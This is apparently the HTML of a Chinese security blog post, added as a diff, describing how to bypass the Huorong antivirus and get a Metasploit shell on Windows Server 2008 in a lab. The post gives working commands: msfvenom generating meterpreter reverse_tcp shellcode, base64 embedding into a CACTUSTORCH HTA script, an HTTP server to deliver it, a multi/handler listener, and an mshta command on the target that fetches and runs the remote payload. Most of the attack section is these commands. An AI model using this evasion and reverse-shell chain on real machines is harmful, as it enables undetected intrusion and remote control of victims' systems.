@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>绕过火绒上线MSF</title>
+    <meta name="description" content="绕过火绒上线MSF">
+    <meta name="keywords" content='bypass'>
+
+    <meta property="og:url" content="https://gokarna-hugo.netlify.app/posts/2021/hipsdaemon-bypass/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="绕过火绒上线MSF">
+    <meta property="og:description" content="绕过火绒上线MSF">
+    <meta property="og:image" content="/images/home.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="绕过火绒上线MSF">
+    <meta name="twitter:description" content="绕过火绒上线MSF">
+    <meta property="twitter:domain" content="https://gokarna-hugo.netlify.app/posts/2021/hipsdaemon-bypass/">
+    <meta property="twitter:url" content="https://gokarna-hugo.netlify.app/posts/2021/hipsdaemon-bypass/">
+    <meta name="twitter:image" content="/images/home.jpg">
+
+    
+    <link rel="canonical" href="https://gokarna-hugo.netlify.app/posts/2021/hipsdaemon-bypass/" />
+
+    <link rel="stylesheet" type="text/css" href="https://gokarna-hugo.netlify.app/css/normalize.min.css" media="print" onload="this.media='all'">
+    <link rel="stylesheet" type="text/css" href="https://gokarna-hugo.netlify.app/css/main.css">
+    <link disabled id="dark-theme" rel="stylesheet" href="https://gokarna-hugo.netlify.app/css/dark.css">
+
+    <script src="https://gokarna-hugo.netlify.app/js/svg-injector.min.js"></script>
+    <script src="https://gokarna-hugo.netlify.app/js/feather-icons.min.js"></script>
+    <script src="https://gokarna-hugo.netlify.app/js/main.js"></script>
+
+    
+    
+        <!-- KaTeX -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css" integrity="sha384-Xi8rHCmBmhbuyyhbI88391ZKP2dmfnOl4rT9ZfRI7mLTdk1wblIUnrIq35nqwEvC" crossorigin="anonymous">
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js" integrity="sha384-X/XCfMm41VSsqRNQgDerQczD69XqmjOOOwYQvr/uuC+j4OPoNhVgjdGFwhvN02Ja" crossorigin="anonymous"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js" integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"></script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+          // customised options
+          // • auto-render specific keys, e.g.:
+          delimiters: [
+            {left: '$$', right: '$$', display: true},
+            {left: '$', right: '$', display: false},
+          ],
+          // • rendering keys, e.g.:
+          throwOnError : false
+        });
+      });
+    </script>
+  
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://gokarna-hugo.netlify.app">
+                <img src="https://gokarna-hugo.netlify.app/images/home.jpg" alt="avatar" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://gokarna-hugo.netlify.app">2867a0</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://gokarna-hugo.netlify.app/"><span data-feather='home'></span> Home </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://gokarna-hugo.netlify.app/posts"><span data-feather='book'></span> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://gokarna-hugo.netlify.app/tags/"><span data-feather='tag'></span> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://gokarna-hugo.netlify.app/about/"><span data-feather='code'></span> About </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/2867a0"><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://gokarna-hugo.netlify.app/"><span data-feather='home'></span> Home </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://gokarna-hugo.netlify.app/posts"><span data-feather='book'></span> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://gokarna-hugo.netlify.app/tags/"><span data-feather='tag'></span> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://gokarna-hugo.netlify.app/about/"><span data-feather='code'></span> About </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/2867a0"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>绕过火绒上线MSF</h1>
+        <small role="doc-subtitle">绕过火绒上线MSF</small>
+        <p class="post-date">
+            November 13, 2021
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://gokarna-hugo.netlify.app/tags/bypass">bypass</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <p>[TOC]</p>
+<!-- raw HTML omitted -->
+<h2 id="环境">环境</h2>
+<table>
+<thead>
+<tr>
+<th>攻击机</th>
+<th>靶机</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>kali + msf + hta脚本</td>
+<td><strong>Windows Server 2008</strong> + mshta</td>
+</tr>
+<tr>
+<td>IP: 10.0.0.4</td>
+<td>IP: 10.0.0.100</td>
+</tr>
+</tbody>
+</table>
+<!-- raw HTML omitted -->
+<h2 id="复现">复现</h2>
+<h3 id="kali">kali</h3>
+<p>下载原始hta<a href="https://github.com/mdsecactivebreach/CACTUSTORCH">脚本</a>（1.hta），msf生成原始32位windows shellcode，并将shellcode进行base64编码。将编码后的shellcode替换原始hta脚本（2.hta）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost<span style="color:#f92672">=</span>10.0.0.4 lport<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f raw &gt; shellcode.bin
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat shellcode.bin | base64 -w <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p><img src="/images/2021/1.png" alt="1.png"></p>
+<p>kali开启http服务准备投递hta脚本</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo python3 -m http.server <span style="color:#ae81ff">8888</span>
+</span></span></code></pre></div><p>开启msf准备接收反弹shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfconsole
+</span></span><span style="display:flex;"><span>use exploit/multi/handler
+</span></span><span style="display:flex;"><span>set payload windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>set lhost 10.0.0.4
+</span></span><span style="display:flex;"><span>set lport <span style="color:#ae81ff">443</span>      <span style="color:#75715e">#开启443需要root权限</span>
+</span></span><span style="display:flex;"><span>run
+</span></span></code></pre></div><h3 id="windows-server-2008">Windows Server 2008</h3>
+<p>开启cmd执行<code>mshta http://10.0.0.4:8888/2.hta</code>，火绒不拦截也未检测出<code>2.hta</code>为恶意payload，kali获得shell</p>
+<p><img src="/images/2021/2.png" alt="2.png"></p>
+<!-- raw HTML omitted -->
+<h2 id="其他">其他</h2>
+<h3 id="hta脚本静态查杀情况">hta脚本静态查杀情况</h3>
+<p>原始脚本<code>1.hta</code>火绒可以查杀，修改后的脚本<code>2.hta</code>也可以查杀</p>
+<p><img src="/images/2021/3.png" alt="3.png"></p>
+<p><img src="/images/2021/4.png" alt="4.png"></p>
+<h3 id="链接">链接</h3>
+<p><a href="https://mp.weixin.qq.com/s/Oe1ARbfpoPiognCGDQ4HeA">记一次绕过火绒安全提权实战案例</a></p>
+<p><a href="https://github.com/mdsecactivebreach/CACTUSTORCH">Github hta脚本</a></p>
+
+        </p>
+    </div>
+
+    <div class="prev-next">
+        
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#环境">环境</a></li>
+        <li><a href="#复现">复现</a>
+          <ul>
+            <li><a href="#kali">kali</a></li>
+            <li><a href="#windows-server-2008">Windows Server 2008</a></li>
+          </ul>
+        </li>
+        <li><a href="#其他">其他</a>
+          <ul>
+            <li><a href="#hta脚本静态查杀情况">hta脚本静态查杀情况</a></li>
+            <li><a href="#链接">链接</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    <span>&copy; 2023 The Marauders</span>
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
